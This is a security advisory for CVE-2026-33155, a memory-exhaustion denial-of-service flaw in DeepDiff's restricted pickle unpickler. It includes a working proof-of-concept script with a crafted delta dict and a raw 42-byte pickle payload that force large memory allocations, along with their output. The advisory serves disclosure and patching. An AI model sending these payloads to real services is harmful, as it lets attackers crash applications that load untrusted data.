# [H] DeepDiff has Memory Exhaustion DoS through SAFE_TO_IMPORT

## Summary
Severity: High
Advisory: GHSA-54jj-px8x-5w5q
CVE: CVE-2026-33155
CWE: CWE-400, CWE-770
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-54jj-px8x-5w5q
Type: github-advisory

## Affected
- PyPI: `deepdiff` — affected >=5.0.0 <8.6.2

## Details
### Summary

The pickle unpickler `_RestrictedUnpickler` validates which classes can be loaded but does not limit their constructor arguments. A few of the types in `SAFE_TO_IMPORT` have constructors that allocate memory proportional to their input (`builtins.bytes`, `builtins.list`, `builtins.range`). A 40-byte pickle payload can force 10+ GB of memory, which crashes applications that load delta objects or call `pickle_load` with untrusted data.

### Details

CVE-2025-58367 hardened the delta class against pollution and remote code execution by converting `SAFE_TO_IMPORT` to a `frozenset` and blocking traversal. `_RestrictedUnpickler.find_class` only gates which classes can be loaded. It doesn't intercept `REDUCE` opcodes or validate what is passed to constructors.

It can be exploited in 2 ways.

**1 - During `pickle_load`**

A pickle that calls `bytes(N)` using opcodes permitted by the allowlist. The allocation happens during deserialization and before the delta processes anything. The restricted unpickler does not override `load_reduce` so any allowed class can be called.

```
GLOBAL builtins.bytes      (passes find_class check — serialization.py:353)
INT    10000000000          (10 billion)
TUPLE + REDUCE             → bytes(10**10) → allocates ~9.3 GB
```

**2 - During delta application**

A valid diff dict that first sets a value to a large int via `values_changed`, then converts it to bytes via `type_changes`. It works because `_do_values_changed()` runs before `_do_type_changes()` in `Delta.add()` in `delta.py` line 183. Step 1 modifies the target in place before step 2 reads the modified value and calls `new_type(current_old_value)` at `delta.py` line 576 with no size guard.

### PoC

The script uses Python's `resource` module to cap memory to 1 GB so you can reproduce safely without hitting the OOM killer. It loads deepdiff first, applies the limit, then runs the payload. Change `10**8` to `10**10` for the full 9.3 GB allocation.

```python
import resource
import sys

def limit_memory(maxsize_mb):
    """Cap virtual memory for this process."""
    soft, hard = resource.getrlimit(resource.RLIMIT_AS)
    maxsize_bytes = maxsize_mb * 1024 * 1024
    try:
        resource.setrlimit(resource.RLIMIT_AS, (maxsize_bytes, hard))
        print(f"[*] Memory limit set to {maxsize_mb} MB")
    except ValueError:
        print("[!] Failed to set memory limit.")
        sys.exit(1)

# Load heavy imports before enforcing the limit
from deepdiff import Delta
from deepdiff.serialization import pickle_dump, pickle_load

limit_memory(1024)

# --- Delta application path ---
payload_dict = {
    'values_changed': {"root['x']": {'new_value': 10**8}},
    'type_changes': {"root['x']": {'new_type': bytes}},
}

payload1 = pickle_dump(payload_dict)
print(f"Payload size: {len(payload1)} bytes")

target = {'x': 'anything'}
try:
    result = target + Delta(payload1)
    print(f"Allocated: {len(result['x']) // 1024 // 1024} MB")
    print(f"Amplification: {len(result['x']) // len(payload1)}x")
except MemoryError:
    print("[!] MemoryError — payload tried to allocate too much")

# --- Raw pickle path ---
payload2 = (
    b"(dp0\n"
    b"S'_'\n"
    b"cbuiltins\nbytes\n"
    b"(I100000000\n"
    b"tR"
    b"s."
)

print(f"Payload size: {len(payload2)} bytes")
try:
    result2 = pickle_load(payload2)
    print(f"Allocated: {len(result2['_']) // 1024 // 1024} MB")
except MemoryError:
    print("[!] MemoryError — payload tried to allocate too much")
```

Output:
```
[*] Memory limit set to 1024 MB
Payload size: 123 bytes
Allocated: 95 MB
Amplification: 813008x
Payload size: 42 bytes
Allocated: 95 MB
```

### Impact

Denial of service. Any application that deserializes delta objects or calls `pickle_load` with untrusted inputs can be crashed with a small payload. The restricted unpickler is meant to make this safe. It prevents remote code execution but doesn't prevent resource exhaustion.

The amplification is large. 800,000x for delta and 2,000,000x for raw pickle.

Impacted users are anyone who accepts serialized delta objects from untrusted sources — network APIs, file uploads, message queues, etc.

## References
- https://github.com/qlustered/deepdiff/security/advisories/GHSA-54jj-px8x-5w5q
- https://nvd.nist.gov/vuln/detail/CVE-2026-33155
- https://github.com/qlustered/deepdiff/commit/0d07ec21d12b46ef4e489383b363eadc22d990fb
- https://github.com/seperman/deepdiff
